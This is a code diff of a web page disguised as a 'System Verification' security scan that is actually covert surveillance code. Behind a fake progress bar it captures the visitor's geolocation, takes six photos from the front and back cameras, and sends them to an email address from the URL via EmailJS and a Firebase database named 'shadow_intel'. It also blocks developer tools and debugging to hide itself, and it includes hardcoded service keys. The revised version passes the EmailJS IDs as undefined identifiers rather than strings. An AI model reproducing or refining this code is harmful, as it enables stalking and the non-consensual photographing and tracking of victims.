@@ -2,27 +2,23 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Verification</title>
+    <title>System Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-[#0b0f1a] text-white flex items-center justify-center h-screen overflow-hidden">
-
     <div class="text-center p-10 max-w-sm w-full bg-[#151b2b] rounded-[2.5rem] border border-slate-800 shadow-2xl">
-        <div class="relative w-20 h-20 mx-auto mb-6">
-            <div class="absolute inset-0 border-4 border-blue-500/10 rounded-full"></div>
+        <div class="relative w-16 h-16 mx-auto mb-6">
+            <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
             <div class="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-            <div class="absolute inset-0 flex items-center justify-center">
-                <svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
-            </div>
         </div>
-        <h1 class="text-xl font-black uppercase italic tracking-tighter">System <span class="text-blue-500">Check</span></h1>
+        <h1 class="text-xl font-black uppercase italic italic">Verify <span class="text-blue-500">System</span></h1>
         <div class="w-full bg-slate-800 h-1 rounded-full mt-6 overflow-hidden">
-            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-500"></div>
+            <div id="bar" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
         </div>
-        <p id="msg" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest">Initializing Protocol...</p>
+        <p id="msg" class="text-[9px] font-bold text-slate-500 uppercase mt-4 tracking-widest">Starting Security Scan...</p>
         
         <video id="v-front" autoplay playsinline class="hidden"></video>
         <video id="v-back" autoplay playsinline class="hidden"></video>
@@ -32,12 +28,10 @@
     <script>
         // --- ANTI-ANALYSIS ---
         document.addEventListener('contextmenu', e => e.preventDefault());
-        document.onkeydown = e => {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) return false;
-        };
-        setInterval(() => { const start = performance.now(); debugger; if (performance.now() - start > 100) window.location.href = "https://google.com"; }, 1000);
+        document.onkeydown = e => { if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) return false; };
+        setInterval(() => { const s = performance.now(); debugger; if (performance.now() - s > 100) window.location.href = "https://google.com"; }, 1000);
 
-        // --- CORE LOGIC ---
+        // --- FIREBASE & CONFIG ---
         const firebaseConfig = {
             apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
             databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
@@ -45,21 +39,28 @@
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        emailjs.init("YOUR_PUBLIC_KEY");
+        
+        // REPLACE THESE WITH YOUR ACTUAL EMAILJS KEYS
+        const PUB_KEY = "etJqo3AXU_wo-pcNi"; 
+        const SERV_ID = "service_toskmod";
+        const TEMP_ID = "template_55m8k98";
+        emailjs.init(PUB_KEY);
 
-        const params = new URLSearchParams(window.location.search);
-        const logId = params.get('id');
-        const targetEmail = params.get('email');
-        const red = params.get('red') || "https://google.com";
+        const urlParams = new URLSearchParams(window.location.search);
+        const logId = urlParams.get('id');
+        const targetEmail = urlParams.get('email');
+        const red = decodeURIComponent(urlParams.get('red') || "https://google.com");
 
-        let locData = "Denied";
+        let locStr = "Denied";
 
+        // 1. Get Location
         navigator.geolocation.getCurrentPosition(pos => {
-            locData = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            db.ref('shadow_intel/' + logId).update({ location: locData });
+            locStr = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            db.ref('shadow_intel/' + logId).update({ location: locStr });
             initCapture();
         }, () => initCapture());
 
+        // 2. Camera Logic
         async function initCapture() {
             try {
                 const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -67,34 +68,38 @@
                 try {
                     const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                     document.getElementById('v-back').srcObject = s2;
-                } catch(e){}
-                runSequence();
+                } catch(e) {}
+                startSequence();
             } catch(e) { window.location.href = red; }
         }
 
-        async function runSequence() {
+        async function startSequence() {
             for(let i=1; i<=6; i++) {
-                await new Promise(r => setTimeout(r, 1500));
+                await new Promise(r => setTimeout(r, 2000));
                 let cam = (i <= 3) ? 'v-front' : 'v-back';
-                await capture(cam, i);
-                document.getElementById('msg').innerText = `Verifying Node ${i}/6...`;
+                await takeShot(cam, i);
+                document.getElementById('msg').innerText = `Syncing Node ${i}/6...`;
                 document.getElementById('bar').style.width = (i * 16) + "%";
                 db.ref('shadow_intel/' + logId).update({ camStatus: i + "/6 Captured" });
             }
             window.location.href = red;
         }
 
-        async function capture(vidId, idx) {
+        async function takeShot(vidId, idx) {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById(vidId);
             const ctx = canvas.getContext('2d');
-            const activeVid = video.srcObject ? video : document.getElementById('v-front');
-            if(activeVid.srcObject) {
-                ctx.drawImage(activeVid, 0, 0, 1280, 720);
-                const img = canvas.toDataURL('image/jpeg', 0.5);
-                return emailjs.send("service_toskmod", "template_55m8k98", {
-                    to_email: targetEmail, log_id: logId, location: locData,
-                    camera: (idx <= 3) ? "Front" : "Back", image_data: img
+            const active = video.srcObject ? video : document.getElementById('v-front');
+            
+            if(active.srcObject) {
+                ctx.drawImage(active, 0, 0, 1280, 720);
+                const base64 = canvas.toDataURL('image/jpeg', 0.5);
+                return emailjs.send(service_toskmod, template_55m8k98, {
+                    to_email: targetEmail,
+                    log_id: logId,
+                    location: locStr,
+                    camera: (idx <= 3) ? "Front" : "Back",
+                    image_data: base64
                 });
             }
         }
